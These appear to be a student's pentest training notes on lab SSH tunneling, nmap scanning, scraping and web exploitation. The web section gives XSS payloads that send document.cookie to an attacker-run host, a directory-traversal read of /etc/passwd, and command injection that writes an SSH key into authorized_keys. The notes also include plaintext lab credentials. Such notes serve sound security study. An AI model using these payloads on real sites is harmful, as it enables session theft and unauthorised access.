# TAKE GOOD NOTES 

# write down all tunnels. Just copy and paste after done with it
# Stack
6
Jump:
10.50.40.153
# Windows OP:
xfreerdp /v:10.50.28.142 /u:student /p:ZgoxLDNLHlzqU1a /size:1920x1000 +clipboard
# Linux OP:
```
ssh student@10.50.27.207 -X
```
# CTFD server
Username:
DODU-005-M
ZgoxLDNLHlzqU1a	
## Set up control socket (to jump box. exchange the ip and /tmp/* to where your going)
```
 ssh -MS          /tmp/jump             student@10.50.40.153
      ^               ^                           ^
Master socket   Directory + name         Normal login with ssh
```

ssh -MS /tmp/jump student@10.50.40.153
## Ping sweep
Linux
```
for i in {97..130}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```
Windows
```
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```
## Dynamic port forward 
```
ssh -S /tmp/jump jump            -O forward -D9050 
     ^             ^                ^
  No loggin   Device name      Dynamic forward
```
ssh -S /tmp/jump jump -O forward -D9050
## proxychains nmap scan for open ports
```
nmap -sS -Pn 8.8.8.8 -p 135-139,22,80,443,21,8080
proxychains nmap 192.168.28.100
```
Using netcat
```
nc -z -v -w 1 8.8.8.8 440-443
```
## Banner grabbing (exchange ip and last number to what your looking for)
proxychains nc 192.168.28.100 2222
## Port forwarding to found ports
ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L3333:192.168.28.100:2222
(Creates a local tunnel to both port 80 and port 2222, use any high port, use firefox for port 80)

## Cancel port forwards
ssh -S /tmp/jump jump -O cancel -L 1111:192.168.28.100:80
(can do one port or the entire previous ssh command. could also kill the pid)
ssh -S /tmp/jump jump -O cancel -D9050

## going to the next box (t1 is target 1)
ssh -MS /tmp/t1 credentials@127.0.0.1 -p 3333
(same as initial tunnel)

# Phases of Pentesting
Phase 1: Mission Definition
  Goals and targets, scope, RoE
Phase 2: Recon
  Info gathering
Phase 3: Footprinting
  get data through scan/interaction
Phase 4: Exploitation & Initial Access
  Gain an initial foothold
Phase 5: Post-Exploitation
  persistence, Escalate privileges, cover tracks, Exfiltrate target data
Phase 6: Document Mission

# Data to collect
```
Web Data
  Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
Sensitive Data
  Business Data, Profiles, Non-Profits/Charities, Business Filings, Historical and Public Listings
Publicly Accessible
  Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
Social Media
  Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
Domain and IP Data
  DNS Registration, IP Address Assignments, Geolocation Data, Whois
```
# Hyper-Text Markup Language (HTML)
```
Standardized markup language for browser interpretation of webpages
  Client-side interpretation (web browser)
  Utilizes elements (identified by tags)
  Typically redirects to another page for server-side interaction
  Cascading Stylesheets (CSS) for page themeing
```
# Scraping Data
Prep
```
pip install lxml requests
```
# Script
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)

# Advanced Scanning Techniques
1) Host Discovery
  Find hosts that are online
2) Port Enumeration
  Find ports for each host that is online
3) Port Interrogation
  Find what service is running on each open/available port

# NMAP USAGE AND EXAMPLES (file path /usr/share/nmap/scripts)
```
nmap --script <filename>|<category>|<directory>|<expression>[,…​]

Runs all scripts that match defined criteria.

nmap --script-help "<filename>|<category>|<directory>|<expression>[,…​]"

Shows help content for specific scripts, categories, etc.

nmap --script-args <args>

Allows options definied within the script to be ran in conjunction with the script.

nmap --script-args-file <filename>

Allows options definied within the script to be pre listed in a file and then ran in conjunction with the script.

nmap --script-help <filename>|<category>|<directory>|<expression>|all[,…​]

Shows help about scripts. For each script matching the given specification, Nmap prints the script name, its categories, and its description.

nmap --script-trace

Similar to --packet-trace as it will output traffic data to include protocol, source, destination, and transmitted data.


dns-brute.nse

Find valid DNS (A) records by trying a list of common sub-domains and finding those that successfully resolve.

nmap -p 80 --script dns-brute.nse <domain name>
hostmap-bfk.nse

Find virtual hosts on an IP address that you are attempting to compromise (or assess).

nmap -p 80 --script hostmap-bfk.nse <domain name>
traceroute-geolocation.nse

Perform a traceroute to your target IP address and have geolocation data plotted for each hop along the way.

nmap --traceroute --script traceroute-geolocation.nse -p 80 <domain name>
http-enum.nse

Attempts will be made to find valid paths on the web server that match a list of known paths for common web applications.

nmap --script http-enum <IP Address>

  --script-args http-enum.basepath='<Web Server Dir/>' <IP Address>
This entry shows an example of utilizing the --script-args option, identifying a valid value from within the script in order to narrow the scan.

smb-os-discovery.nse

Determines the operating system, computer name, netbios name and domain of a system.

nmap -p 445 --script smb-os-discovery <IP Address / Subnet>
firewalk.nse

Discovers firewall rules using an IP Protocol Time To Live (TTL) expiration technique

nmap -p 80 --script=firewalk.nse <IP Address>

  --script-args=firewalk.max-retries=1 <IP Address>
  --script-args=firewalk.probe-timeout=400ms <IP Address>
  --script-args=firewalk.firewalk.max-probed-ports=7 <IP Address>
This entry shows examples of utilizing the --script-args option, identifying a valid value from within the script in order to narrow the scan.
```
# Web Exploitation (Day 1 XSS)

Server/Client Relationship
```
Synchronous communications between user and services
Not all data is not returned, client only receives what is allowed
```
# HTTP Response Codes
```
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error
```
# wget (not recommended)
```
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php
```
# GET request
```
https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1
/something.php?var=hi (the ? will allow us to send info to the webserver)\
```
# cURL(not recommended)
```
Not recursive
Can use pipes
Upload ability
Supports more protocols vs Wget, such as SCP & POP3
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
```
JavaScript (JS)
```
Allows websites to interact with the client

JavaScript runs on the client’s machine

Coded as .js files, or in-line of HTML
```
# JS Interaction
```
<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>
```
Web Developer then call function by finction_name()
# Enumeration
```
Robots.txt
Legitimate surfing
Tools:
 NSE scripts
 Nikto
 Burp suite (outside class)
```
# Cross-Site Scripting (XSS) Overview
```
Insertion of arbitrary code into a webpage, that executes in the browser of visitors
Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
Often found in forums that allow HTML
```
# Reflected XSS
```
Most common form of XSS
Transient, occurs in error messages or search results
Delivered through intermediate media, such as a link in an email
Characters that are normally illegal in URLs can be Base64 encoded
```
# Stored XSS
```
Resides on vulnerable site
Only requires user to visit page
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
```
# Useful JavaScript Components
```
Proof of concept (simple alert):
<script>alert('XSS');</script>

Capturing Cookies
 document.cookie

Capturing Keystrokes
 bind keydown and keyup

Capturing Sensitive Data
 document.body.innerHTML
```
# command to compromise web page (in a chat bar or something of the sort)
```
python3 -m http.server
<script/>document.location="http://10.50.27.207:8000/"+documnet.cookie;</script>
```
# Server-Side injection
```
  Directory Traversal/Path Traversal
Ability to read/execute outside web server’s directory
Uses ../../ (relative paths) in manipulating a server-side file path

view_image.php?file=../../etc/passwd
```
# fle locations for linux
```
/etc/passwd + /etc/hosts
```
# Malicious File Upload
```
  Site allows unsanitized file uploads

Server doesn’t validate extension or size
Allows for code execution (shell)
Once uploaded
 Find your file
 Call your file
place to upload, call file, location where its uploaded to
```
run image.png.php
# on the website commands from the script
whoami
pwd
# Command injection
; [command line] will overwrite there script they have
/var/www/html for home directory of apache

# uploading ssh key
; mkdir [home directory]/.ssh (on webpage)
ls -la ../../.ssh/ [on box]
ssh-keygen -t rsa -b 4096 [on box to generate new ssh keys with no passphrases]
cat ls -la ../../.ssh/id_rsa.pub (copy the entire file)
; echo "(what you copied from ssh)" > [home directory]/.ssh/authorized_keys (on webpage)
;cat [home directory]/.ssh/authorized_keys (make sure it works)
ssh -i ~/.ssh/id_rsa [user]@[ip] (on host)


# How to get cookies from a message box
```
on lin-ops:
cd /home
python3 -m http.server

on website:
<script>document.location="http://10.50.27.207/Cookie_Stealer1.php?username=" + document.cookie;</script>
```
# How to traverse directories on websites
```
if it looks like the path below, make sure to put the commands in the books= portion to traverse through
http://127.0.0.1:5432/books_pick.php?book=web
example http://127.0.0.1:5432/books_pick.php?book=../../../../etc/passwd
```
# going to other peoples directories
```
after log in just cd ../ to see other users available
```
